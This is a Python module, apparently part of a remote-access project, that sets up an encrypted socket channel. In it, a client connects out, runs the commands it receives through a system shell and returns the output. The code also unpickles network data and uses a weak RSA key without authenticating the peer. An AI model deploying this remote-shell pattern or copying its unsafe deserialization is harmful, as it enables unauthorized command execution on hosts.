# Date: 07/27/2018
# Author: Pure-L0G1C
# Description: Secure shell

import os 
import socket
import pickle
import subprocess
from time import sleep
from queue import Queue 
from threading import Thread 
from socket import timeout as TimeOutError
from . crypto import CryptoRSA, CryptoSalsa20

class Communicate(object):

 def __init__(self, private_key, session, recipient_public_key):
  self.recipient_public_key = recipient_public_key
  self.private_key = private_key
  self.session_recv = 4096**2
  self.session = session
  self.is_alive = True
  self.pending = False 
  self.resp = None 

  self.recvs_encrypted = Queue()
  self.recvs_decrypted = Queue()

 def recv(self):
  self.session.settimeout(0.5)
  while self.is_alive:
   try:
    recv = self.session.recv(self.session_recv)
    if recv:
     self.recvs_encrypted.put(recv)
    else:self.stop()
   except TimeOutError:pass
   except:self.stop()

 def recv_parser(self):
  while self.is_alive:
   while self.recvs_encrypted.qsize():
    if not self.is_alive:break
    try:
     pkt = pickle.loads(self.recvs_encrypted.get())
     ciphertext = pkt['ciphertext']
     nonce = pkt['nonce']
     key = CryptoRSA.decrypt(self.private_key, pkt['key'])
     data = CryptoSalsa20.decrypt(ciphertext, key, nonce).decode('utf8')
     self.pending = False
     self.resp = None
     if data != '-1':
      self.resp = data
      self.recvs_decrypted.put(data)
    except:
     pass 

 def send(self, data):
  if len(data.strip()):
   if not self.is_alive:return 
   cipher = CryptoSalsa20.encrypt(data.encode('utf8'))
   ciphertext, key, nonce = cipher[0], CryptoRSA.encrypt(self.recipient_public_key, cipher[1]), cipher[2]
   pkt = pickle.dumps({ 'ciphertext': ciphertext, 'key': key, 'nonce': nonce })
   try:
    self.session.sendall(pkt)
    self.pending = True
   except:
    pass 

 def start(self):
  recv = Thread(target=self.recv)
  parser = Thread(target=self.recv_parser)

  recv.daemon = True 
  parser.daemon = True

  recv.start()
  parser.start() 
  
 def stop(self):
  self.is_alive = False 

class Client(object):

 def __init__(self, communication):
  self.communication = communication
  self.home = os.getcwd()
  self.is_alive = True 

 def start(self):
  self.communication.start()
  while all([self.is_alive, self.communication.is_alive]):
   while self.communication.recvs_decrypted.qsize():
    cmd = self.communication.recvs_decrypted.get()
    output = self.exe(cmd)
    self.communication.send(output)    

 def exe(self, cmd):
  if cmd.strip() == 'cls':return '-1'
  proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
  output = proc[0].decode('utf8')
  errors = proc[1].decode('utf8')
  output = output if output else errors

  if cmd.split()[0] == 'cd':
   if len(cmd.split()) != 1:
    path = cmd.split()[1]
    if os.path.exists(path):
     os.chdir(path)
  return output if len(output) else '-1'

 def stop(self):
  self.is_alive = False
  self.communication.is_alive = False

class Server(object):

 def __init__(self, communication):
  self.communication = communication
  self.communication.start()
  self.is_alive = True
  
 def stop(self):
  self.is_alive = False
  self.communication.is_alive = False

 def send(self, cmd):
  if len(cmd.strip()):
   if not self.communication.pending:
    self.communication.send(cmd)
    while all([self.is_alive, self.communication.is_alive, self.communication.pending]):pass 
    return self.communication.resp 
   
class SSH(object):

 RSA_KEY_SIZE = 1280 # Apple's iMessage RSA key size

 def __init__(self, ip, port, max_time=10, verbose=False):
  self.ip = ip 
  self.port = port  
  self.verbose = verbose
  self.max_time = max_time
  self.session_size = 64**2
  self.communication = None 
  self.recipient_session = None
  self.recipient_public_key = None 
  
  self.display('Generating RSA key pair ...')
  self.public_key, self.private_key = CryptoRSA.generate_keys(self.RSA_KEY_SIZE)
  self.display('Keys generated')

 def display(self, msg):
  if self.verbose:
   print('{}\n'.format(msg))

 def handshake(self, is_server=False):
  if is_server:
   # receive public key
   self.recipient_public_key = self.recipient_session.recv(self.session_size)
   
   # send public key
   sleep(0.5)
   self.recipient_session.sendall(self.public_key)
  else:
   # send public key
   sleep(0.5)
   self.recipient_session.sendall(self.public_key)

   # receive public key
   self.recipient_public_key = self.recipient_session.recv(self.session_size)

 def start(self):
  server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
  server_socket.settimeout(self.max_time)  

  try:
   server_socket.bind((self.ip, self.port))
   server_socket.listen(1)
   return server_socket
  except OSError:
   self.display('Failed to start ssh server on {}:{}'.format(self.ip, self.port))
  
 def serve(self, server_socket):
  try:
   self.recipient_session, addr = server_socket.accept() 
  except TimeOutError:
   self.display('Server timed out')
   self.close()
   return -1

  self.handshake(is_server=True)
  communication = Communicate(self.private_key, 
                              self.recipient_session, 
                              self.recipient_public_key)
  if self.communication:
   self.communication.stop()

  self.communication = Server(communication)
  return 0
  
 def close(self):
  try:
   if self.communication:self.communication.stop()
   self.recipient_session.shutdown(socket.SHUT_RDWR)
   self.recipient_session.close()
  except:pass

 def send(self, cmd):
  if self.communication:
   return self.communication.send(cmd)
    
 def client(self):
  self.recipient_session = socket.socket()
  self.recipient_session.settimeout(self.max_time)
  try:
   self.recipient_session.connect((self.ip, self.port))
  except ConnectionRefusedError: 
   self.display('Failed to connect to {}:{}'.format(self.ip, self.port))
   return -1

  self.handshake(is_server=False)
  communication = Communicate(self.private_key, 
                              self.recipient_session, 
                              self.recipient_public_key)

  if self.communication:
   self.communication.stop()

  self.communication = Client(communication)  
  self.communication.start()
  return 0